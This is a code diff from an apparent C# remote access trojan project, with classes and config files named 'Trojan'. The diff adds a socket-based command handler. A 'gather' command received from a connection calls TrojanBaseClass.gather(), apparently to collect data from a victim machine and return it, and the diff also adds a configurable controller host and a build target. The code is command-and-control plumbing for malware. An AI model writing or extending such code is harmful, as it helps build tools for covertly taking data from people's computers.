@@ -17,21 +17,36 @@ namespace SocketData
         OUTPUTTING = 4,
     }
 
-    public enum CommandName
+    public static class CommandExtension
     {
-        GATHER,
-    }
-
-    static class CommandExtension
-    {
-        public static string ExecuteCommand(this CommandName command)
+        static List<string> CommandNames = new List<string>
         {
-            switch(command)
+            "gather",
+        };
+
+        public static string CheckForCommand(string input)
+        {
+            string command = input.Split(" ")[1];
+
+            for (int i = 0; i < CommandNames.Count(); i++)
             {
-                case CommandName.GATHER:
-                    return("AHEHE");
+                if (command == CommandNames[i])
+                {
+                    return(command);
+                }
+            }
+
+            return ("");
+        }
+
+        public static string ExecuteCommand(string CommandName)
+        {
+            switch(CommandName)
+            {
+                case("gather"):
+                    return(TrojanBaseClass.gather());
                 default:
-                    return("AHEHE?");
+                    return("");
             }
         }
     }
@@ -40,17 +55,18 @@ namespace SocketData
     {
         public static List<ConnectionSetup> connections = new List<ConnectionSetup>();
         public static Queue<string> DataQueue = new Queue<string>();
-        public static string[]? DataArray;
+        public static string[]? DataArray = null;
 
         public static void OutputDataQueue()
         {
+            Console.WriteLine("\n\n");
             Console.WriteLine("\r##########################################################################################################################################");
             DataArray = DataQueue.ToArray();
             foreach (string Data in DataArray)
             {
-                string message = "[+] Received_FromClient[{0}] :: Message_Size[{1} bytes]";
-                Console.WriteLine("\n\n\t" + message, Data, Encoding.UTF8.GetByteCount(Data));
-                Console.Write("\t" + new string('*', message.Length + Data.Length - 4));
+                string message = "{0}";
+                Console.WriteLine("\n\n" + message, Data, Encoding.UTF8.GetByteCount(Data));
+                //Console.Write("\t" + new string('*', message.Length + Data.Length - 4));
                 DataQueue.Dequeue();
             }
             Console.WriteLine("\n\n##########################################################################################################################################");
@@ -61,17 +77,18 @@ namespace SocketData
     {
         private readonly Socket _s_conn;
         private byte[] _buffer;
+        private Task? _ReceiveTask = null;
 
         public Socket getConn()
         {
             if (_s_conn == null) throw new ExceptionHandler("[-] Connection socket can not be null : " + nameof(_s_conn));
-            return _s_conn;
+            return(_s_conn);
         }
 
         public byte[] getBuffer()
         {
             if (_buffer == null) throw new ExceptionHandler("[-] Buffer can not be null : " + nameof(_buffer));
-            return _buffer;
+            return(_buffer);
         }
 
         public void setBuffer(byte[] buffer)
@@ -80,6 +97,19 @@ namespace SocketData
             if (buffer == null) throw new ExceptionHandler("[-] Buffer can not be null : " + nameof(buffer));
 
             _buffer = buffer;
+        }
+
+        // this is unsafe as getReceiveTask can return null
+        public Task getReceiveTask()
+        {
+            return(_ReceiveTask);
+        }
+
+        public void setReceiveTask(Task task)
+        {
+            if (task == null) throw new ExceptionHandler("[-] task can not be null : " + nameof(task));
+
+            _ReceiveTask = task;
         }
 
         public EndPoint getRemoteEndPoint()
@@ -149,9 +179,9 @@ namespace SocketData
             return command.Substring(0, length);
         }
 
-        public string CheckForCommand(string input) { return(""); }
         public string RespondToCommand(Socket sock) { return(""); }
-        
+
+        public static IPAddress? HOST = null;
         public static ushort PORT;
         public static uint BUFFSIZE;
 
@@ -162,6 +192,8 @@ namespace SocketData
         public static int RECEIVE_TIMEOUT;
         public static int EVENT_CHECK_INTERVAL;
 
+        public static string? BUILDFOR;
+
         protected SocketOperations _SocketOperations = new SocketOperations();
         public ServerStatus ServerStatus = ServerStatus.STOPPED;
         public ServerStatus SenderStatus = ServerStatus.IDLE;
@@ -170,7 +202,7 @@ namespace SocketData
 
         public SocketHandler()
         {
-            using (StreamReader ConfigFile = new StreamReader(@"..\..\..\TrojanBuild\trojan.cfg"))
+            using (StreamReader ConfigFile = new StreamReader(@"C:\Users\lasse\source\repos\Trojan\trojan-config.cfg"))
             {
                 if (ConfigFile == null) throw new ExceptionHandler("Config file not found : " + nameof(ConfigFile));
                 string line;
@@ -179,6 +211,9 @@ namespace SocketData
                     string[] LineParts = line.Split(" ");
                     switch (LineParts[0])
                     {
+                        case "host":
+                            HOST = IPAddress.Parse(LineParts[2]);
+                            break;
                         case "port":
                             PORT = ushort.Parse(LineParts[2]);
                             break;
@@ -199,6 +234,9 @@ namespace SocketData
                             break;
                         case "event_check_interval":
                             EVENT_CHECK_INTERVAL = int.Parse(LineParts[2]);
+                            break;
+                        case "buildfor":
+                            BUILDFOR = LineParts[2];
                             break;
                         default: throw new ExceptionHandler("All values not set in trojan.cfg file : " + nameof(ConfigFile));
                     }
